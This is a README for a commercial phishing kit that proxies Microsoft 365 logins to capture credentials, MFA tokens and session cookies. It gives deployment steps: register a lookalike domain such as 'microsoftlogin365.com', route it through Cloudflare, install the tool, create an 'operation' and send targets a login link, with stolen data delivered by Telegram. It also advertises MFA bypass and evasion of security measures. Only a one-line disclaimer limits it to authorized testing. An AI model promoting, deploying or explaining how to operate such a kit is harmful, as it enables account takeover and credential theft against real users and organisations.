
# Sauron - Microsoft 365 MITM Proxy

A powerful phishing tool that intercepts Microsoft 365 login flows to capture credentials, cookies, and session data in real-time.

## ✨ What It Does

- **Captures Credentials**: Gets usernames, passwords, and 2FA tokens
- **Steals Sessions**: Harvests authentication cookies
- **Real-time Monitoring**: WebSocket dashboard for live campaign tracking
- **Auto SSL**: Automatic HTTPS certificates via Let's Encrypt
- **Advanced Evasion**: Bot detection bypass and traffic obfuscation

## 🚀 Quick Start

### 1. Requirements

- Ubuntu 20.04+ server with root access
- Domain name (buy from any registrar)
- Cloudflare account (free)

### 2. Setup Your Domain

1. Buy a domain like `microsoftlogin365.com`
2. Add it to Cloudflare (free account)
3. Set DNS: `*.yourdomain.com` → your server IP

### 3. Install

#### Commercial Docker Release (Recommended)

```bash
# Download the commercial release
# Contact sales for access to: sauron-v2.0.0-pro-docker.tar.gz

# Extract release package
tar -xzf sauron-v2.0.0-pro-docker.tar.gz
cd docker-release-v2.0.0-pro

# Configure environment
cp .env.example .env
nano .env  # Fill in your SAURON_DOMAIN, CLOUDFLARE_API_TOKEN, etc.

# Deploy (installs Docker automatically)
sudo ./deploy-docker.sh
```

#### Development Build (Source Code Access Required)

```bash
# Only for licensed developers with source access
git clone https://github.com/Skillz147/Sauron-Pro.git
cd Sauron-Pro
cp .env.example .env
nano .env
sudo bash install/setup.sh
```

### 4. Configure

The setup script will ask for:

- **Domain**: Your purchased domain (e.g., `microsoftlogin365.com`)
- **Cloudflare API Token**: Get from Cloudflare dashboard
- **Turnstile Secret**: Get from Cloudflare Turnstile settings

### 5. Create Operation

1. Open the admin dashboard: `https://yourdomain.com/admin`
2. Create a new slug (unique operation ID)
3. Send targets to: `https://login.yourdomain.com/your-slug`

## 📱 Usage

### Managing Operations

```bash
# Check status
sudo systemctl status sauron

# View live logs
sudo journalctl -u sauron -f

# Restart service
sudo systemctl restart sauron
```

### Getting Results

- **Telegram**: Auto-delivery of captured data
- **WebSocket Dashboard**: Real-time monitoring
- **Logs**: JSON formatted results in system logs

## 🛡️ Features

- **TLS Interception**: Full Microsoft 365 flow capture
- **Anti-Detection**: Bypasses modern security measures
- **Cookie Harvesting**: Maintains persistent access
- **2FA Bypass**: Captures MFA tokens and session cookies
- **Operation Isolation**: Multiple simultaneous operations

## 📚 Documentation

For detailed setup guides, troubleshooting, and advanced features:
**[📖 Full Documentation](https://skillz147.github.io/Sauron-Pro)**

## ⚠️ Legal Notice

This tool is for authorized security testing only. Users are responsible for compliance with applicable laws and regulations.

## 🔧 Internal Development

**For licensed developers and internal team only**

```bash
# Clone source repository (requires access)
git clone https://github.com/Skillz147/Sauron-Pro.git
cd Sauron-Pro

# Build commercial Docker release
./scripts/build-docker-release.sh v2.0.0-pro

# Build binary release
./scripts/build-release.sh v2.0.0-pro

# Deploy to development server
./scripts/deploy-production.sh docker
```

## 📞 Support

- **Issues**: [GitHub Issues](https://github.com/Skillz147/Sauron-Pro/issues)
- **Documentation**: [GitHub Pages](https://skillz147.github.io/Sauron-Pro)
- **Security Reports**: Private disclosure preferred
